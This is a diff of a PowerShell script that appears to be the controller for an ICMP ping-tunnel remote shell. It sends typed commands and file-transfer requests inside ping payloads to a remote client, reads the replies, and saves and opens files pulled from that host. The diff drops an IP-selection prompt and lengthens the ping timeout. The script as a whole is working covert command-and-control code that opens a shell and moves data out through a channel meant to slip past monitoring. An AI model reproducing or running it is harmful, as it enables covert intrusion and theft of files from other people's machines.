@@ -15,10 +15,6 @@ function GAC {
 }
 
 $BindingIP = ((Get-NetIPAddress | Where-Object { $_.AddressState -eq "Preferred" -and $_.ValidLifetime -lt "24:00:00" }).IPAddress)
-if ($BindingIP.length -ge 2) {
-    $i = 0; $BindingIP | % { write-host "$($i)": "$($BindingIP[$($i)])"; $i++ }
-    $inp = Read-Host Which IpAddress; $BindingIP = $BindingIP[$inp]
-}
 
 (GAC).IPv4Address
 $SendingIP = Read-Host "Client ADDRESS"
@@ -42,23 +38,24 @@ function ret {
 
 clear-host
 Write-Verbose "#Send Host Ip Packet " #Send Host Ip Packet 
-if (($sc.Send([ipaddress]$SendingIP, "20", (([text.encoding]::ASCII).GetBytes("H_IP" + $EL)), $PingOptions)).Status -eq "Success") {
-    $sc.Send([ipaddress]$SendingIP, "20", (([text.encoding]::ASCII).GetBytes($BindingIP + $EL)), $PingOptions) | out-null
+if (($sc.Send([ipaddress]$SendingIP, 60 * 1000, (([text.encoding]::ASCII).GetBytes("H_IP" + $EL)), $PingOptions)).Status -eq "Success") {
+    $sc.Send([ipaddress]$SendingIP, 60 * 1000, (([text.encoding]::ASCII).GetBytes($BindingIP + $EL)), $PingOptions) | out-null
     $pRs.Receive($buffer) | out-null; $banner = (ret)
     write-host $banner
 
     $pRs.Receive($buffer) | out-null
     write-host -nonewline (ret); $inp = $Host.UI.ReadLine()
-    if ($inp -eq "cls") {clear-host;write-host $banner
-        $sc.Send([ipaddress]$SendingIP, "20", (([text.encoding]::ASCII).GetBytes($inp + $EL)), $PingOptions) | out-null
+    if ($inp -eq "cls") {
+        clear-host; write-host $banner
+        $sc.Send([ipaddress]$SendingIP, 60 * 1000, (([text.encoding]::ASCII).GetBytes($inp + $EL)), $PingOptions) | out-null
     }
     elseif ($inp -eq "Transfer") {
         write-host -nonewline "Infile > "; $Infile = ($Host.UI.ReadLine()).Replace('"', '')
         write-host -nonewline "Outfile > "; $Outfile = ($Host.UI.ReadLine()).Replace('"', '')
         
-        ($sc.Send([ipaddress]$SendingIP, "20", (([text.encoding]::ASCII).GetBytes("Transfer" + $EL)), $PingOptions)) | out-null
+        ($sc.Send([ipaddress]$SendingIP, 60 * 1000, (([text.encoding]::ASCII).GetBytes("Transfer" + $EL)), $PingOptions)) | out-null
         Write-Verbose "Transfer"
-        ($sc.Send([ipaddress]$SendingIP, "20", (([text.encoding]::ASCII).GetBytes($Infile + $EL)), $PingOptions)) | out-null
+        ($sc.Send([ipaddress]$SendingIP, 60 * 1000, (([text.encoding]::ASCII).GetBytes($Infile + $EL)), $PingOptions)) | out-null
 
         write-host "" | Out-File $Outfile
         $pRs.Receive($buffer) | out-null
@@ -88,23 +85,27 @@ if (($sc.Send([ipaddress]$SendingIP, "20", (([text.encoding]::ASCII).GetBytes("H
         Start-Process $Outfile
 
     }
-    else {$sc.Send([ipaddress]$SendingIP, "20", (([text.encoding]::ASCII).GetBytes($inp + $EL)), $PingOptions) | out-null}
+    else { $sc.Send([ipaddress]$SendingIP, 60 * 1000, (([text.encoding]::ASCII).GetBytes($inp + $EL)), $PingOptions) | out-null }
 }
 
 while ($true) {
-    $pRs.Receive($buffer) | out-null; (ret)
+    $pRs.Receive($buffer) | out-null; 
+    $out = (ret);$out.replace("     ","`n")
+
+
     $pRs.Receive($buffer) | out-null; write-host -nonewline (ret); $inp = $Host.UI.ReadLine()
 
-    if ($inp -eq "cls") {clear-host;write-host $banner
-        $sc.Send([ipaddress]$SendingIP, "20", (([text.encoding]::ASCII).GetBytes($inp + $EL)), $PingOptions) | out-null
+    if ($inp -eq "cls") {
+        clear-host; write-host $banner
+        $sc.Send([ipaddress]$SendingIP, 60 * 1000, (([text.encoding]::ASCII).GetBytes($inp + $EL)), $PingOptions) | out-null
     }
     elseif ($inp -eq "Transfer") {
         write-host -nonewline "Infile > "; $Infile = ($Host.UI.ReadLine()).Replace('"', '')
         write-host -nonewline "Outfile > "; $Outfile = ($Host.UI.ReadLine()).Replace('"', '')
         
-        ($sc.Send([ipaddress]$SendingIP, "20", (([text.encoding]::ASCII).GetBytes("Transfer" + $EL)), $PingOptions)) | out-null
+        ($sc.Send([ipaddress]$SendingIP, 60 * 1000, (([text.encoding]::ASCII).GetBytes("Transfer" + $EL)), $PingOptions)) | out-null
         Write-Verbose "Transfer"
-        ($sc.Send([ipaddress]$SendingIP, "20", (([text.encoding]::ASCII).GetBytes($Infile + $EL)), $PingOptions)) | out-null
+        ($sc.Send([ipaddress]$SendingIP, 60 * 1000, (([text.encoding]::ASCII).GetBytes($Infile + $EL)), $PingOptions)) | out-null
 
         write-host "" | Out-File $Outfile
         $pRs.Receive($buffer) | out-null
@@ -134,5 +135,5 @@ while ($true) {
         Start-Process $Outfile
 
     }
-    else {$sc.Send([ipaddress]$SendingIP, "20", (([text.encoding]::ASCII).GetBytes($inp + $EL)), $PingOptions) | out-null}
+    else { $sc.Send([ipaddress]$SendingIP, 60 * 1000, (([text.encoding]::ASCII).GetBytes($inp + $EL)), $PingOptions) | out-null }
 }
